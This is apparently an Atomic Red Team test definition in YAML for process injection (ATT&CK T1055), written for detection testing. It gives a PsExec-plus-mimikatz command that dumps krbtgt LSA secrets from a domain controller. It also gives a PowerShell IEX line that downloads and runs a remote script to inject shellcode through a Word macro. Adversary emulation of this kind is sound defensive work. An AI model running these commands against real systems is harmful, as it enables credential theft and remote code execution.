attack_technique: T1055
display_name: Process Injection
atomic_tests:
- name: Process Injection via mimikatz
  description: |
    Use mimikatz to retrieve lsass process content via injection of a dll
  supported_platforms:
  - windows
  input_arguments:
    mimikatz_path:
      description: mimikatz windows executable
      type: Path
      default: C:\\Users\\PlayerOne\\Documents\\Mimikatz\\x64\\mimikatz.exe
    psexec_path:
      description: psexec windows executable
      type: Path
      default: C:\\Users\\PlayerOne\\Documents\\Mimikatz\\x64\\PsExec.exe
    account:
      description: Account to impersonate
      type: string
      default: krbtgt
    machine:
      description: machine to target
      type: string
      default: DC1
    output_file:
      description: Output file
      type: path
      default: C:\\Users\\PlayerOne\\Documents\\Mimikatz\\x64\\mimikatz.log
  executor:
    command: |
      #{psexec_path} /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /name:#{account}" "exit" > #{output_file}
    name: powershell
    elevation_required: true
- name: Shellcode execution via VBA
  auto_generated_guid: 1c91e740-1729-4329-b779-feba6e71d048
  description: |
    This module injects shellcode into a newly created process and executes. By default the shellcode is created,
    with Metasploit, for use on x86-64 Windows 10 machines.

    Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office
    is required.
  supported_platforms:
  - windows
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The 64-bit version of Microsoft Office must be installed
    prereq_command: |
      try {
        $wdApp = New-Object -COMObject "Word.Application"
        $path = $wdApp.Path
        Stop-Process -Name "winword"
        if ($path.contains("(x86)")) { exit 1 } else { exit 0 }
      } catch { exit 1 }
    get_prereq_command: |
      Write-Host "You will need to install Microsoft Word (64-bit) manually to meet this requirement"
  executor:
    command: |
      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
      Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -officeProduct "Word" -sub "Execute"
    name: powershell